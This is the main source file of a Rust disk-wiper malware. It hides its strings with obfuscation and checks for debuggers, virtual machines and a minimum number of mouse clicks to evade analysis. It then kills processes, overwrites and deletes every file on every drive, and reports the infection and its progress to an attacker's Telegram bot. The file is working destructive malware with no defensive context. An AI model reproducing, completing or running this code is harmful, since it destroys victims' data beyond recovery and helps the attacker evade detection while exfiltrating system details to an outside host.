use enumr::{sysinfos,get_drives};
use rayon::prelude::*;
use obfstr::obfstr;
mod walk;
mod write;
mod enumr;
mod tg;
mod misc;
mod anti;

fn main() 
{
let token:String = obfstr!("0000000:AAAAAAAAAAA-BBBBBBBB").to_string();
let userid:String = obfstr!("000000000").to_string();
let sizew:u32 = 1024;//bytes to overwrite before deletion
let min_clicks:u32 = 5;//left clicks before execution

    if anti::debugger() && anti::mouse_clicks(min_clicks) && anti::is_not_vm()
    {
        //kill
        misc::kproc();
        get_drives().par_iter().for_each(|op| 
            {
        let mut text = sysinfos();
        //notify infection
        tg::bot(text.join("\n"),token.to_owned(),userid.to_owned(),String::new());
        
        
        let paths = walk::listpath(op.to_string());
        text.push(format!("\n\n\n{}{}{}{}{}\n\n\n",obfstr!("⚠ DISK : "),op,obfstr!(" => PREPARING "),paths.len(),obfstr!(" Files For WIPING ⚠")));
        
        //notify listing
        tg::bot(text.join("\n"),token.to_owned(),userid.to_owned(),String::new());
        
        //multithread wiping
        paths.par_iter().for_each(|f| 
            {
                write::wipe(f.to_string(),sizew);
                
            });
        
        //notify finish
        let mut text = sysinfos();
        text.push(format!("\n\n\n{}{}{}\n\n\n",obfstr!("⚡ DISK : "),op,obfstr!(" WIPED SUCCESSFULLY ⚡")));
        tg::bot(text.join("\n"),token.to_owned(),userid.to_owned(),String::new());
        misc::recovery();
        
         });
    }
    else 
    {
        std::process::exit(0);
    }
}

